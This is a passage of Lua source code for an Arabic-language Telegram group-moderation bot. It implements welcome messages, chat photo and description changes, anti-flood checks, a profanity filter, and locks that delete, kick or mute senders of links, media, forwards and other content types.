t = GetWelcomeGroup
else  
t = '\n• نورت حبي \n•  name \n• user' 
end 
t = t:gsub('name',result.first_name_) 
t = t:gsub('user',('@'..result.username_ or 'لا يوجد')) 
send(msg.chat_id_, msg.id_,t)
end,nil) 
end 
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.photo_ then  
if database:get(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,'⚠┇ عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا') 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,'⚠┇… ليس لدي صلاحية تغيير معلومات المجموعه يرجى المحاوله لاحقا') 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,'܁༯┆تم تغير الصوره ↝ ܰ') 
end
end, nil) 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"📌┇ تم الغاء وضع الوصف") 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
send(msg.chat_id_, msg.id_,'܁༯┆تم تغير وصف المجموعة ↝ ܰ')   
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"܁༯┆تم الغاء حفض الترحيب ↝ ܰ") 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,'܁༯┆تم حفض الترحيب ܊ قم بالتجربه ܊ ↝ ܰ')   
return false   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'الغاء' then
send(msg.chat_id_,msg.id_,"܁༯┆تم الغاء حفظ الرابط ܊ ↝ ܰ")       
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)")   
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_,"܁༯┆تم حفظ الرابط ܊ قم بالتجربه ܊ ↝ ܰ")       
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
--------------------------------------------------------------------------------------------------------------
if MILAN_Msg and not Special(msg) then  
local MILAN_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if MILAN_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..MILAN_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/R_IQ9)}\n🚫┇["..MILAN_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
--------------------------------------------------------------------------------------------------------------
if not Special(msg) and msg.content_.ID ~= "MessageChatAddMembers" and database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") then 
floods = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") or 'nil'
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 5
local post_count = tonumber(database:get(bot_id..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_) or 0)
if post_count > tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5) then 
local ch = msg.chat_id_
local type = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") 
trigger_anti_spam(msg,type)  
end
database:setex(bot_id..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_, tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) 
local edit_id = data.text_ or 'nil'  
NUM_MSG_MAX = 5
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") then
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") 
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") then
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") 
end 
end 
--------------------------------------------------------------------------------------------------------------
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Manager(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fars'..msg.chat_id_) and not Manager(msg) then 
list = {'a','u','y','l','t','b','A','Q','U','J','K','L','B','D','L','V','Z','k','n','c','r','q','o','z','I','j','m','M','w','d','h','e'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id..'lock:text'..msg.chat_id_) and not Special(msg) then       
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
database:incr(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Special(msg) then   
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
chat_kick(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Special(msg) then 
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
chat_kick(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Special(msg) then     
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVideo' and not Special(msg) then     
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Special(msg) then     
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Special(msg) then     
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAudio' and not Special(msg) then     
if database:get(bot_id.."lock:Audio"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVoice' and not Special(msg) then     
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not Special(msg) then     
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageSticker' and not Special(msg) then     
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if tonumber(msg.via_bot_user_id_) ~= 0 and not Special(msg) then
if database:get(bot_id.."lock:inline"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Special(msg) then     
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageDocument' and not Special(msg) then     
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Special(msg) then      
if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Special(msg) then
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageContact' and not Special(msg) then      
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Special(msg) then  
local _nl, ctrl_ = string.gsub(text, '%c', '')  
local _nl, real_ = string.gsub(text, '%d', '')   
sens = 400  
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if msg.content_.ID == 'MessageSticker' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filtersteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.set_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, "܁༯┆عذرأ يا  ◃ @["..data.username_.."]  ↝ ܰ\n܁༯┆الملصق التي ارسلتهاا تم منعهاا من المجموعةه  ↝ ܰ\n" ) 
else
send(msg.chat_id_,0, "܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](T.ME/R_IQ9)  ↝ ܰ\n܁༯┆الملصق التي ارسلتهاا تم منعهاا من المجموعةه  ↝ ܰ\n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

------------------------------------------------------------------------

------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"܁༯┆عذرأ يا  ◃ @["..data.username_.."]  ↝ ܰ\n܁༯┆الصوره التي ارسلتهاا تم منعهاا من المجموعةه  ↝ ܰ\n" ) 
else
send(msg.chat_id_,0,"܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](T.ME/R_IQ9)  ↝ ܰ\n܁༯┆الصوره التي ارسلتهاا تم منعهاا من المجموعةه  ↝ ܰ\n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"܁༯┆عذرأ يا  ◃ @["..data.username_.."]  ↝ ܰ\n܁༯┆المتحركةه التي ارسلتهاا تم منعهاا من المجموعةه  ↝ ܰ\n") 
else
send(msg.chat_id_,0,"܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](T.ME/R_IQ9)  ↝ ܰ\n܁༯┆المتحركةه التي ارسلتهاا تم منعهاا من المجموعةه  ↝ ܰ\n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

if text == 'تفعيل' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆البوت ليس ادمن يرجئ ترقيتي... ! ↝ ܰ') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not SudoBot(msg) then
